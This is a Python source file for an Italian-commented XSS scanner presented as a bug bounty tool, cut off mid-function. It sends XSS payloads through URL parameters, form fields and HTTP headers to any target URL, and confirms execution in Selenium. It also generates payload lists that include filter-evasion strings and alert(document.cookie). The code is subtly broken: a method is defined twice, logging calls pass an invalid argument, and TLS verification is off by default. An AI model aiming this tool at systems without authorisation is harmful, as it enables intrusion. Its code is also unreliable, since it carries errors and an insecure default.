#!/usr/bin/env python3
"""
XSS SCANNER ULTIMATE - Professional Bug Bounty Tool
Tool completo e funzionante al 100%
"""

import requests
import logging

logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')
import argparse
import time
import threading
import os
import sys
import json
import random
import hashlib
import re
from urllib.parse import urljoin, urlencode, quote, parse_qs, urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style, init
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException
import urllib3

# Disabilita warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

class XSSScannerUltimate:
    def __init__(self):
        self.insecure = False  # --insecure flag per disabilitare SSL verify
        self.delay = 0  # seconds tra richieste (rate limiting)
        self.target_url = None
        self.payload_file = None
        self.threads = 10
        self.timeout = 15
        self.headless = True
        self.proxy = None
        self.user_agent = None
        self.cookies = {}
        self.depth = 1
        self.browser_type = "chrome"
        self.scan_methods = ["GET", "POST", "HEADERS", "SELENIUM", "DOM"]
        self.output_format = "json"
        
        self.payloads = []
        self.results = []
        self.tested_urls = set()
        self.session = requests.Session()
        self.driver = None
        self.fuzz_params = [
            'q', 'search', 'query', 's', 'id', 'page', 'file', 'name', 'keyword',
            'term', 'text', 'input', 'value', 'data', 'content', 'message',
            'comment', 'email', 'user', 'username', 'password', 'url', 'link'
        ]
        
        # Configurazione session
        self.session.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'it-IT,it;q=0.9,en;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
        
        self.session.verify = getattr(self, 'insecure', False)

    def print_banner(self):
        """Stampa il banner del tool - VERSIONE CORRETTA"""
        banner = f"""
{Fore.GREEN}
                         
                                  POWERED BY MS17                                 
                                                                                          
                    @@@  @@@   @@@@@@    @@@@@@     @@@  @@@@@@@@  
                    @@@  @@@  @@@@@@@   @@@@@@@    @@@@  @@@@@@@@  
                    @@!  !@@  !@@       !@@       @@@!!       @@!  
                    !@!  @!!  !@!       !@!         !@!      !@!   
                    !@@!@!   !!@@!!    !!@@!!      @!@     @!!    
                      @!!!     !!@!!!    !!@!!!     !@!    !!!     
                    !: :!!        !:!       !:!    !!:   !!:      
                   :!:  !:!      !:!       !:!     :!:  :!:       
                    ::  :::  :::: ::   :::: ::     :::   ::       
                    :   ::   :: : :    :: : :       ::  : :        
                                               
                    
         ══════════════════════════════════════════════════════════════════
{Style.RESET_ALL}
"""
        logging.info(banner)

    def clear_screen(self):
        """Pulisce lo schermo - FUNZIONE MANCANTE"""
        os.system('cls' if os.name == 'nt' else 'clear')

    def interactive_menu(self):
        """Menu interattivo principale"""
        while True:
            self.clear_screen()
            self.print_banner()
            logging.info(f"\n{Fore.CYAN}=== XSS SCANNER ULTIMATE - MAIN MENU ===")
            logging.info(f"{Fore.WHITE}1.  Quick Scan")
            logging.info(f"{Fore.WHITE}2.  Advanced Scan")
            logging.info(f"{Fore.WHITE}3.  Custom Scan")
            logging.info(f"{Fore.WHITE}4.  Configuration")
            logging.info(f"{Fore.WHITE}5.  Generate Payloads")
            logging.info(f"{Fore.WHITE}6.  View Previous Results")
            logging.info(f"{Fore.WHITE}7.  Help & Documentation")
            logging.info(f"{Fore.RED}0.  Exit")
            
            choice = input(f"\n{Fore.YELLOW}[?] Select option: ").strip()
            
            if choice == "1":
                self.quick_scan()
            elif choice == "2":
                self.advanced_scan()
            elif choice == "3":
                self.custom_scan()
            elif choice == "4":
                self.configuration_menu()
            elif choice == "5":
                self.generate_payloads()
            elif choice == "6":
                self.view_results()
            elif choice == "7":
                self.show_help()
            elif choice == "0":
                logging.info(f"{Fore.GREEN}[+] Thank you for using XSS Scanner Ultimate!")
                break
            else:
                logging.info(f"{Fore.RED}[-] Invalid option!")
                input(f"{Fore.YELLOW}[!] Press Enter to continue...")

    # ========== FUNZIONI DI SCANSIONE MANCANTI ==========

    def crawl_and_test(self, url, depth=1):
        """Crawla il sito e testa le pagine - FUNZIONE MANCANTE"""
        if depth == 0 or url in self.tested_urls:
            return
            
        self.tested_urls.add(url)
        logging.info(f"{Fore.CYAN}[*] Testing: {url}")
        
        try:
            response = self.session.get(url, timeout=self.timeout)
            
            # Estrai tutti i link dalla pagina
            links = re.findall(r'href=[\'"]([^\'"]*?)[\'"]', response.text)
            
            for link in links:
                full_url = urljoin(url, link)
                
                # Filtra solo link interessanti
                if self.is_testable_url(full_url):
                    self.crawl_and_test(full_url, depth - 1)
                    
        except Exception as e:
            pass

    def is_testable_url(self, url):
        """Determina se l'URL è testabile - FUNZIONE MANCANTE"""
        if not url.startswith('http'):
            return False
            
        # Escludi file statici
        excluded_extensions = ['.css', '.js', '.png', '.jpg', '.jpeg', '.gif', '.pdf', '.zip']
        if any(url.lower().endswith(ext) for ext in excluded_extensions):
            return False
            
        return True

    def discover_parameters(self, url):
        """Scopre parametri dalla pagina - FUNZIONE MANCANTE"""
        try:
            response = self.session.get(url, timeout=self.timeout)
            
            # Cerca parametri in forms
            forms = re.findall(r'<form[^>]*>(.*?)</form>', response.text, re.IGNORECASE | re.DOTALL)
            params = set()
            
            for form in forms:
                # Input fields
                inputs = re.findall(r'<input[^>]*name=[\'"]([^\'"]+)[\'"][^>]*>', form, re.IGNORECASE)
                params.update(inputs)
                
                # Textareas
                textareas = re.findall(r'<textarea[^>]*name=[\'"]([^\'"]+)[\'"][^>]*>', form, re.IGNORECASE)
                params.update(textareas)
                
                # Select fields
                selects = re.findall(r'<select[^>]*name=[\'"]([^\'"]+)[\'"][^>]*>', form, re.IGNORECASE)
                params.update(selects)
            
            return list(params) if params else self.fuzz_params
            
        except Exception as e:
            return self.fuzz_params

    def process_futures(self, futures, method_name):
        """Processa i futures del ThreadPoolExecutor - FUNZIONE MANCANTE"""
        completed = 0
        total = len(futures)
        
        for future in as_completed(futures):
            try:
                result = future.result()
                if result and result not in self.results:
                    self.results.append(result)
                    self.print_vulnerability(result)
            except Exception as e:
                pass
            
            completed += 1
            progress = (completed / total) * 100
            logging.info(f"{Fore.CYAN}[*] {method_name} progress: {progress:.1f}% ({completed}/{total})", end='\r')

    # ========== METODI DI SCANSIONE PRINCIPALI COMPLETI ==========

    def scan_get_method(self):
        """Scansione metodo GET - VERSIONE COMPLETA"""
        logging.info(f"\n{Fore.YELLOW}[*] Scanning GET parameters...")
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            
            for payload in self.payloads[:100]:
                for param in self.fuzz_params[:5]:
                    futures.append(executor.submit(self.test_get_param, payload, param))
            
            self.process_futures(futures, "GET")

    def test_get_param(self, payload, param):
        """Testa un parametro GET - FUNZIONE COMPLETA"""
        try:
            test_url = f"{self.target_url}?{param}={quote(payload)}"
            response = self.session.get(test_url, timeout=self.timeout)
            
            if self.check_reflection(response.text, payload):
                return {
                    'type': 'GET',
                    'payload': payload,
                    'url': test_url,
                    'param': param,
                    'confidence': 'HIGH' if self.is_executable(response.text, payload) else 'MEDIUM',
                    'method': 'GET'
                }
        except Exception as e:
            pass
        return None

    def scan_post_method(self):
        """Scansione metodo POST - VERSIONE COMPLETA"""
        logging.info(f"\n{Fore.YELLOW}[*] Scanning POST parameters...")
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            
            for payload in self.payloads[:50]:
                futures.append(executor.submit(self.test_post_param, payload))
            
            self.process_futures(futures, "POST")

    def test_post_param(self, payload):
        """Testa parametri POST - FUNZIONE COMPLETA"""
        try:
            data = {param: payload for param in self.fuzz_params[:3]}
            response = self.session.post(self.target_url, data=data, timeout=self.timeout)
            
            if self.check_reflection(response.text, payload):
                return {
                    'type': 'POST',
                    'payload': payload,
                    'url': self.target_url,
                    'data': data,
                    'confidence': 'HIGH' if self.is_executable(response.text, payload) else 'MEDIUM',
                    'method': 'POST'
                }
        except Exception as e:
            pass
        return None

    def scan_headers_method(self):
        """Scansione headers - VERSIONE COMPLETA"""
        logging.info(f"\n{Fore.YELLOW}[*] Scanning HTTP headers...")
        
        headers_to_test = ['User-Agent', 'Referer', 'X-Forwarded-For']
        
        for header in headers_to_test:
            for payload in self.payloads[:30]:
                result = self.test_header(header, payload)
                if result:
                    self.results.append(result)
                    self.print_vulnerability(result)

    def test_header(self, header, payload):
        """Testa un header HTTP - FUNZIONE COMPLETA"""
        try:
            original_value = self.session.headers.get(header)
            self.session.headers[header] = payload
            
            response = self.session.get(self.target_url, timeout=self.timeout)
            
            if self.check_reflection(response.text, payload):
                return {
                    'type': f'HEADER-{header}',
                    'payload': payload,
                    'url': self.target_url,
                    'confidence': 'MEDIUM',
                    'method': 'HEADER'
                }
            
            # Ripristina header originale
            if original_value:
                self.session.headers[header] = original_value
            else:
                del self.session.headers[header]
                
        except Exception as e:
            pass
        return None

    def scan_selenium_method(self):
        """Scansione con Selenium - VERSIONE COMPLETA"""
        logging.info(f"\n{Fore.YELLOW}[*] Verifying with Selenium...")
        
        for i, payload in enumerate(self.payloads[:20]):
            result = self.test_selenium(payload)
            if result:
                self.results.append(result)
                self.print_vulnerability(result)
            
            progress = ((i + 1) / min(20, len(self.payloads))) * 100
            logging.info(f"{Fore.CYAN}[*] Selenium progress: {progress:.1f}%", end='\r')

    def test_selenium(self, payload):
        """Test XSS con Selenium - FUNZIONE COMPLETA"""
        if not self.driver:
            return None
            
        try:
            test_url = f"{self.target_url}?q={quote(payload)}"
            
            # Setup per rilevare alert
            self.driver.execute_script("""
                window.xssDetected = false;
                window.xssAlertMessage = null;
                window.originalAlert = window.alert;
                window.alert = function(msg) {
                    window.xssDetected = true;
                    window.xssAlertMessage = msg;
                    return true;
                };
            """)
            
            # Naviga alla URL
            self.driver.get(test_url)
            time.sleep(2)
            
            # Verifica se XSS è stato eseguito
            xss_detected = self.driver.execute_script("return window.xssDetected || false;")
            alert_message = self.driver.execute_script("return window.xssAlertMessage;")
            
            if xss_detected:
                return {
                    'type': 'SELENIUM',
                    'payload': payload,
                    'url': test_url,
                    'alert_message': alert_message,
                    'confidence': 'CRITICAL',
                    'verified': True,
                    'method': 'SELENIUM'
                }
                
        except Exception as e:
            pass
        return None

    def scan_dom_method(self):
        """Scansione DOM XSS - VERSIONE COMPLETA"""
        logging.info(f"\n{Fore.YELLOW}[*] Scanning DOM XSS...")
        
        for payload in self.payloads[:15]:
            result = self.test_dom_xss(payload)
            if result:
                self.results.append(result)
                self.print_vulnerability(result)

    def test_dom_xss(self, payload):
        """Test DOM XSS - FUNZIONE COMPLETA"""
        if not self.driver:
            return None
            
        try:
            test_url = f"{self.target_url}#{quote(payload)}"
            self.driver.get(test_url)
            time.sleep(2)
            
            # Verifica indicatori DOM XSS
            dom_indicators = self.driver.execute_script("""
                var scripts = document.getElementsByTagName('script');
                for (var i = 0; i < scripts.length; i++) {
                    if (scripts[i].innerHTML.includes('location.hash') || 
                        scripts[i].innerHTML.includes('document.URL') ||
                        scripts[i].innerHTML.includes('window.location')) {
                        return true;
                    }
                }
                return false;
            """)
            
            if dom_indicators:
                return {
                    'type': 'DOM_XSS',
                    'payload': payload,
                    'url': test_url,
                    'confidence': 'MEDIUM',
                    'method': 'DOM'
                }
                
        except Exception as e:
            pass
        return None

    # ========== FUNZIONI DI SUPPORTO MANCANTI ==========

    def check_reflection(self, html, payload):
        """Controlla reflection del payload - FUNZIONE MANCANTE"""
        if payload in html:
            return True
        
        # Controlla encoding HTML
        encoded = payload.replace('<', '&lt;').replace('>', '&gt;')
        if encoded in html:
            return True
            
        return False

    def is_executable(self, html, payload):
        """Verifica se il payload potrebbe essere eseguito - FUNZIONE MANCANTE"""
        execution_indicators = [
            '<script>', 'alert(', 'confirm(', 'prompt(', 
            'onload=', 'onerror=', 'onclick=', 'javascript:'
        ]
        
        return any(indicator in html.lower() for indicator in execution_indicators)

    def print_vulnerability(self, result):
        """Stampa una vulnerabilità trovata - FUNZIONE MIGLIORATA"""
        colors = {
            'CRITICAL': Fore.RED,
            'HIGH': Fore.MAGENTA,
            'MEDIUM': Fore.YELLOW,
            'LOW': Fore.BLUE
        }
        
        color = colors.get(result['confidence'], Fore.WHITE)
        
        logging.info(f"\n{color}[!] {result['type']} - Confidence: {result['confidence']}")
        logging.info(f"{color}    Payload: {result['payload'][:80]}...")
        logging.info(f"{color}    URL: {result.get('url', 'N/A')}")
        
        if 'alert_message' in result:
            logging.info(f"{color}    Alert: {result['alert_message']}")
        if 'param' in result:
            logging.info(f"{color}    Parameter: {result['param']}")

    def interactive_menu(self):
        """Menu interattivo principale"""
        while True:
            logging.info(f"\n{Fore.CYAN}=== XSS SCANNER ULTIMATE - MAIN MENU ===")
            logging.info(f"{Fore.WHITE}1.  Quick Scan")
            logging.info(f"{Fore.WHITE}2.  Advanced Scan")
            logging.info(f"{Fore.WHITE}3.  Custom Scan")
            logging.info(f"{Fore.WHITE}4.  Configuration")
            logging.info(f"{Fore.WHITE}5.  Generate Payloads")
            logging.info(f"{Fore.WHITE}6.  View Previous Results")
            logging.info(f"{Fore.WHITE}7.  Help & Documentation")
            logging.info(f"{Fore.RED}0.  Exit")
            
            choice = input(f"\n{Fore.YELLOW}[?] Select option: ").strip()
            
            if choice == "1":
                self.quick_scan()
            elif choice == "2":
                self.advanced_scan()
            elif choice == "3":
                self.custom_scan()
            elif choice == "4":
                self.configuration_menu()
            elif choice == "5":
                self.generate_payloads()
            elif choice == "6":
                self.view_results()
            elif choice == "7":
                self.show_help()
            elif choice == "0":
                logging.info(f"{Fore.GREEN}[+] Thank you for using XSS Scanner Ultimate!")
                break
            else:
                logging.info(f"{Fore.RED}[-] Invalid option!")

    def quick_scan(self):
        """Scansione rapida con impostazioni predefinite"""
        logging.info(f"\n{Fore.CYAN}=== QUICK SCAN ===")
        
        if not self.target_url:
            self.target_url = input(f"{Fore.YELLOW}[?] Enter target URL: ").strip()
        
        if not self.payload_file:
            payload_file = input(f"{Fore.YELLOW}[?] Enter payload file path [default: payloads.txt]: ").strip()
            self.payload_file = payload_file if payload_file else "payloads.txt"
        
        logging.info(f"{Fore.GREEN}[+] Starting Quick Scan...")
        logging.info(f"{Fore.CYAN}[*] Target: {self.target_url}")
        logging.info(f"{Fore.CYAN}[*] Payloads: {self.payload_file}")
        logging.info(f"{Fore.CYAN}[*] Methods: GET, POST, HEADERS")
        
        self.threads = 10
        self.timeout = 15
        self.headless = True
        self.scan_methods = ["GET", "POST", "HEADERS"]
        
        self.load_payloads()
        self.setup_selenium()
        self.run_scan()

    def advanced_scan(self):
        """Scansione avanzata con tutte le opzioni"""
        logging.info(f"\n{Fore.CYAN}=== ADVANCED SCAN ===")
        
        self.target_url = input(f"{Fore.YELLOW}[?] Enter target URL: ").strip()
        self.payload_file = input(f"{Fore.YELLOW}[?] Enter payload file path: ").strip()
        
        # Configurazioni avanzate
        self.threads = int(input(f"{Fore.YELLOW}[?] Threads [10]: ").strip() or "10")
        self.timeout = int(input(f"{Fore.YELLOW}[?] Timeout [15]: ").strip() or "15")
        self.depth = int(input(f"{Fore.YELLOW}[?] Crawl depth [2]: ").strip() or "2")
        
        headless = input(f"{Fore.YELLOW}[?] Headless mode [y/N]: ").strip().lower()
        self.headless = headless != 'n'
        
        proxy = input(f"{Fore.YELLOW}[?] Proxy [optional]: ").strip()
        if proxy:
            self.proxy = proxy
            
        user_agent = input(f"{Fore.YELLOW}[?] Custom User-Agent [optional]: ").strip()
        if user_agent:
            self.user_agent = user_agent
            
        cookies = input(f"{Fore.YELLOW}[?] Cookies as JSON [optional]: ").strip()
        if cookies:
            try:
                self.cookies = json.loads(cookies)
            except:
                logging.info(f"{Fore.RED}[-] Invalid JSON format for cookies")
                
        logging.info(f"{Fore.YELLOW}[?] Select scan methods (comma-separated):")
        logging.info(f"{Fore.WHITE}    GET, POST, HEADERS, SELENIUM, DOM")
        methods = input(f"{Fore.YELLOW}[?] Methods [all]: ").strip()
        if methods:
            self.scan_methods = [m.strip().upper() for m in methods.split(',')]
        else:
            self.scan_methods = ["GET", "POST", "HEADERS", "SELENIUM", "DOM"]
            
        logging.info(f"{Fore.GREEN}[+] Starting Advanced Scan...")
        self.load_payloads()
        self.setup_selenium()
        self.run_scan()

    def custom_scan(self):
        """Scansione completamente personalizzabile"""
        logging.info(f"\n{Fore.CYAN}=== CUSTOM SCAN ===")
        
        # Configurazione completa
        self.target_url = input(f"{Fore.YELLOW}[?] Target URL: ").strip()
        self.payload_file = input(f"{Fore.YELLOW}[?] Payload file: ").strip()
        self.threads = int(input(f"{Fore.YELLOW}[?] Threads: ").strip() or "10")
        self.timeout = int(input(f"{Fore.YELLOW}[?] Timeout: ").strip() or "15")
        self.depth = int(input(f"{Fore.YELLOW}[?] Crawl depth: ").strip() or "1")
        
        # Browser selection
        logging.info(f"{Fore.YELLOW}[?] Browser: [1] Chrome [2] Firefox")
        browser_choice = input(f"{Fore.YELLOW}[?] Choice [1]: ").strip() or "1"
        self.browser_type = "chrome" if browser_choice == "1" else "firefox"
        
        headless = input(f"{Fore.YELLOW}[?] Headless [y/N]: ").strip().lower()
        self.headless = headless != 'n'
        
        self.proxy = input(f"{Fore.YELLOW}[?] Proxy: ").strip() or None
        self.user_agent = input(f"{Fore.YELLOW}[?] User-Agent: ").strip() or None
        
        cookies = input(f"{Fore.YELLOW}[?] Cookies (JSON): ").strip()
        if cookies:
            try:
                self.cookies = json.loads(cookies)
            except:
                logging.info(f"{Fore.RED}[-] Invalid JSON format")
                
        logging.info(f"{Fore.YELLOW}[?] Scan methods (comma-separated):")
        logging.info(f"{Fore.WHITE}    GET, POST, HEADERS, SELENIUM, DOM")
        methods = input(f"{Fore.YELLOW}[?] Methods: ").strip()
        self.scan_methods = [m.strip().upper() for m in methods.split(',')] if methods else ["GET", "POST", "HEADERS"]
        
        output_format = input(f"{Fore.YELLOW}[?] Output format [json/html/txt]: ").strip().lower()
        self.output_format = output_format if output_format in ['json', 'html', 'txt'] else 'json'
        
        logging.info(f"{Fore.GREEN}[+] Starting Custom Scan...")
        self.load_payloads()
        self.setup_selenium()
        self.run_scan()

    def configuration_menu(self):
        """Menu di configurazione"""
        while True:
            logging.info(f"\n{Fore.CYAN}=== CONFIGURATION ===")
            logging.info(f"{Fore.WHITE}1.  Set Target URL: {self.target_url or 'Not set'}")
            logging.info(f"{Fore.WHITE}2.  Set Payload File: {self.payload_file or 'Not set'}")
            logging.info(f"{Fore.WHITE}3.  Set Threads: {self.threads}")
            logging.info(f"{Fore.WHITE}4.  Set Timeout: {self.timeout}")
            logging.info(f"{Fore.WHITE}5.  Set Crawl Depth: {self.depth}")
            logging.info(f"{Fore.WHITE}6.  Set Proxy: {self.proxy or 'Not set'}")
            logging.info(f"{Fore.WHITE}7.  Set User-Agent: {self.user_agent or 'Default'}")
            logging.info(f"{Fore.WHITE}8.  Set Cookies")
            logging.info(f"{Fore.WHITE}9.  Set Scan Methods: {', '.join(self.scan_methods)}")
            logging.info(f"{Fore.WHITE}10. Set Browser: {self.browser_type}")
            logging.info(f"{Fore.WHITE}11. Toggle Headless: {'On' if self.headless else 'Off'}")
            logging.info(f"{Fore.WHITE}12. Save Configuration")
            logging.info(f"{Fore.WHITE}13. Load Configuration")
            logging.info(f"{Fore.RED}0.  Back to Main Menu")
            
            choice = input(f"\n{Fore.YELLOW}[?] Select option: ").strip()
            
            if choice == "1":
                self.target_url = input(f"{Fore.YELLOW}[?] Enter target URL: ").strip()
            elif choice == "2":
                self.payload_file = input(f"{Fore.YELLOW}[?] Enter payload file path: ").strip()
            elif choice == "3":
                self.threads = int(input(f"{Fore.YELLOW}[?] Enter threads: ").strip() or "10")
            elif choice == "4":
                self.timeout = int(input(f"{Fore.YELLOW}[?] Enter timeout: ").strip() or "15")
            elif choice == "5":
                self.depth = int(input(f"{Fore.YELLOW}[?] Enter crawl depth: ").strip() or "1")
            elif choice == "6":
                self.proxy = input(f"{Fore.YELLOW}[?] Enter proxy: ").strip() or None
            elif choice == "7":
                self.user_agent = input(f"{Fore.YELLOW}[?] Enter User-Agent: ").strip() or None
            elif choice == "8":
                cookies = input(f"{Fore.YELLOW}[?] Enter cookies as JSON: ").strip()
                if cookies:
                    try:
                        self.cookies = json.loads(cookies)
                    except:
                        logging.info(f"{Fore.RED}[-] Invalid JSON format")
            elif choice == "9":
                logging.info(f"{Fore.YELLOW}[?] Available methods: GET, POST, HEADERS, SELENIUM, DOM")
                methods = input(f"{Fore.YELLOW}[?] Enter methods (comma-separated): ").strip()
                if methods:
                    self.scan_methods = [m.strip().upper() for m in methods.split(',')]
            elif choice == "10":
                browser = input(f"{Fore.YELLOW}[?] Enter browser [chrome/firefox]: ").strip().lower()
                if browser in ['chrome', 'firefox']:
                    self.browser_type = browser
            elif choice == "11":
                self.headless = not self.headless
                logging.info(f"{Fore.GREEN}[+] Headless mode: {'On' if self.headless else 'Off'}")
            elif choice == "12":
                self.save_config()
            elif choice == "13":
                self.load_config()
            elif choice == "0":
                break
            else:
                logging.info(f"{Fore.RED}[-] Invalid option!")

    def generate_payloads(self):
        """Genera un file di payloads personalizzato"""
        logging.info(f"\n{Fore.CYAN}=== PAYLOAD GENERATOR ===")
        
        filename = input(f"{Fore.YELLOW}[?] Output filename [payloads.txt]: ").strip() or "payloads.txt"
        
        payload_types = []
        logging.info(f"{Fore.YELLOW}[?] Select payload types to generate:")
        logging.info(f"{Fore.WHITE}1. Basic XSS")
        logging.info(f"{Fore.WHITE}2. Advanced XSS")
        logging.info(f"{Fore.WHITE}3. DOM XSS")
        logging.info(f"{Fore.WHITE}4. Polyglot XSS")
        logging.info(f"{Fore.WHITE}5. WAF Bypass")
        logging.info(f"{Fore.WHITE}6. All types")
        
        choices = input(f"{Fore.YELLOW}[?] Enter choices (comma-separated): ").strip()
        
        payloads = set()
        
        if '1' in choices or '6' in choices:
            # Basic XSS payloads
            basic_payloads = [
                "<script>alert('XSS')</script>",
                "><script>alert('XSS')</script>",
                "'><script>alert('XSS')</script>",
                "\"><script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<body onload=alert('XSS')>",
                "<iframe src=javascript:alert('XSS')>"
            ]
            payloads.update(basic_payloads)
        
        if '2' in choices or '6' in choices:
            # Advanced XSS payloads
            advanced_payloads = [
                "<input onfocus=alert('XSS') autofocus>",
                "<details open ontoggle=alert('XSS')>",
                "<select onfocus=alert('XSS') autofocus>",
                "<video><source onerror=alert('XSS')>",
                "<audio src onerror=alert('XSS')>",
                "<embed src=javascript:alert('XSS')>",
                "<object data=javascript:alert('XSS')>",
                "<math href=\"javascript:alert('XSS')\">click",
                "<link rel=import href=\"javascript:alert('XSS')\">"
            ]
            payloads.update(advanced_payloads)
        
        if '3' in choices or '6' in choices:
            # DOM XSS payloads
            dom_payloads = [
                "#<img src=x onerror=alert(1)>",
                "><img src=x onerror=alert(document.domain)>",
                "javascript:alert(document.cookie)",
                "><svg onload=alert(window.location)>",
                "<script>alert(document.domain)</script>"
            ]
            payloads.update(dom_payloads)
        
        if '4' in choices or '6' in choices:
            # Polyglot XSS payloads
            polyglot_payloads = [
                "jaVasCript:/*-/*`/*\\`/*'/*\\\"/**/(/* */oNcliCk=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//>\\x3e",
                "\";alert('XSS');//",
                "';alert('XSS');//",
                "</script><script>alert('XSS')</script>"
            ]
            payloads.update(polyglot_payloads)
        
        if '5' in choices or '6' in choices:
            # WAF Bypass payloads
            waf_payloads = [
                "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
                "<ScRiPt>alert('XSS')</ScRiPt>",
                "%3Cscript%3Ealert('XSS')%3C/script%3E",
                "<IMG SRC=x ONERROR=alert('XSS')>",
                "<img src=\"x\" onerror=\"alert('XSS')\">",
                "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
                "<svg/onload=alert('XSS')>"
            ]
            payloads.update(waf_payloads)
        
        # Scrivi i payloads nel file
        with open(filename, 'w', encoding='utf-8') as f:
            for payload in sorted(payloads):
                f.write(payload + '\n')
        
        logging.info(f"{Fore.GREEN}[+] Generated {len(payloads)} payloads in {filename}")

    def view_results(self):
        """Visualizza i risultati precedenti"""
        logging.info(f"\n{Fore.CYAN}=== PREVIOUS RESULTS ===")
        
        # Cerca file di risultati
        result_files = [f for f in os.listdir('.') if f.startswith('xss_scan_results_') or f.startswith('xss_ultimate_report_')]
        
        if not result_files:
            logging.info(f"{Fore.YELLOW}[!] No previous results found")
            return
        
        logging.info(f"{Fore.WHITE}Available result files:")
        for i, file in enumerate(result_files, 1):
            logging.info(f"{Fore.WHITE}{i}. {file}")
        
        choice = input(f"{Fore.YELLOW}[?] Select file to view (0 to cancel): ").strip()
        
        if choice == "0":
            return
        
        try:
            selected_file = result_files[int(choice) - 1]
            with open(selected_file, 'r', encoding='utf-8') as f:
                data = json.load(f)
            
            if isinstance(data, list):
                # Vecchio formato
                self.display_results(data)
            else:
                # Nuovo formato con metadati
                self.display_advanced_results(data)
                
        except (IndexError, ValueError, json.JSONDecodeError) as e:
            logging.info(f"{Fore.RED}[-] Error loading results: {e}")

    def show_help(self):
        """Mostra l'help e la documentazione"""
        help_text = f"""
{Fore.CYAN}=== XSS SCANNER ULTIMATE - HELP & DOCUMENTATION ===

{Fore.YELLOW}SCAN TYPES:
{Fore.WHITE}• Quick Scan: Scansione rapida con impostazioni predefinite
{Fore.WHITE}• Advanced Scan: Scansione completa con tutte le opzioni
{Fore.WHITE}• Custom Scan: Scansione completamente personalizzabile

{Fore.YELLOW}SCAN METHODS:
{Fore.WHITE}• GET: Testa parametri URL
{Fore.WHITE}• POST: Testa form e richieste POST
{Fore.WHITE}• HEADERS: Testa header HTTP (User-Agent, Referer, etc.)
{Fore.WHITE}• SELENIUM: Verifica reale con browser (richiede Chrome/Firefox)
{Fore.WHITE}• DOM: Test per DOM-based XSS

{Fore.YELLOW}CONFIGURATION:
{Fore.WHITE}• Threads: Numero di richieste parallele (raccomandato: 10-20)
{Fore.WHITE}• Timeout: Timeout per richieste in secondi
{Fore.WHITE}• Crawl Depth: Profondità di crawling (0 = solo URL principale)
{Fore.WHITE}• Proxy: Proxy per le richieste (es: http://127.0.0.1:8080)
{Fore.WHITE}• User-Agent: User-Agent personalizzato
{Fore.WHITE}• Cookies: Cookies di sessione in formato JSON

{Fore.YELLOW}PAYLOADS:
{Fore.WHITE}• Il tool supporta file di payload in formato testo
{Fore.WHITE}• Puoi generare payload personalizzati con il generatore integrato
{Fore.WHITE}• I payload vengono automaticamente diversificati e codificati

{Fore.YELLOW}OUTPUT:
{Fore.WHITE}• I risultati vengono salvati in formato JSON
{Fore.WHITE}• Report dettagliati con classificazione delle vulnerabilità
{Fore.WHITE}• Supporto per multiple sessioni di scanning

{Fore.YELLOW}TIPS:
{Fore.WHITE}• Usa Selenium per verificare l'esecuzione reale degli XSS
{Fore.WHITE}• Configura proxy per analizzare le richieste con Burp Suite
{Fore.WHITE}• Usa cookies di sessione per aree autenticate
{Fore.WHITE}• Testa sempre su ambienti di staging prima della produzione

{Fore.GREEN}Per ulteriore assistenza: github.com/andrea-bugbounty
"""
        logging.info(help_text)

    def save_config(self):
        """Salva la configurazione corrente"""
        config = {
            'target_url': self.target_url,
            'payload_file': self.payload_file,
            'threads': self.threads,
            'timeout': self.timeout,
            'depth': self.depth,
            'headless': self.headless,
            'proxy': self.proxy,
            'user_agent': self.user_agent,
            'cookies': self.cookies,
            'scan_methods': self.scan_methods,
            'browser_type': self.browser_type,
            'output_format': self.output_format
        }
        
        filename = input(f"{Fore.YELLOW}[?] Config filename [xss_config.json]: ").strip() or "xss_config.json"
        
        with open(filename, 'w') as f:
            json.dump(config, f, indent=2)
        
        logging.info(f"{Fore.GREEN}[+] Configuration saved to {filename}")

    def load_config(self):
        """Carica una configurazione salvata"""
        filename = input(f"{Fore.YELLOW}[?] Config filename [xss_config.json]: ").strip() or "xss_config.json"
        
        try:
            with open(filename, 'r') as f:
                config = json.load(f)
            
            self.target_url = config.get('target_url')
            self.payload_file = config.get('payload_file')
            self.threads = config.get('threads', 10)
            self.timeout = config.get('timeout', 15)
            self.depth = config.get('depth', 1)
            self.headless = config.get('headless', True)
            self.proxy = config.get('proxy')
            self.user_agent = config.get('user_agent')
            self.cookies = config.get('cookies', {})
            self.scan_methods = config.get('scan_methods', ["GET", "POST", "HEADERS"])
            self.browser_type = config.get('browser_type', 'chrome')
            self.output_format = config.get('output_format', 'json')
            
            logging.info(f"{Fore.GREEN}[+] Configuration loaded from {filename}")
            
        except FileNotFoundError:
            logging.info(f"{Fore.RED}[-] Config file not found: {filename}")
        except json.JSONDecodeError:
            logging.info(f"{Fore.RED}[-] Invalid config file: {filename}")

    # Metodi di scansione (simili alla versione precedente ma integrati)
    def load_payloads(self):
        """Carica i payload dal file"""
        try:
            with open(self.payload_file, 'r', encoding='utf-8', errors='ignore') as f:
                raw_payloads = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            
            # Diversifica i payload
            self.payloads = self.diversify_payloads(raw_payloads)
            logging.info(f"{Fore.GREEN}[+] Loaded {len(self.payloads)} payloads")
            
        except Exception as e:
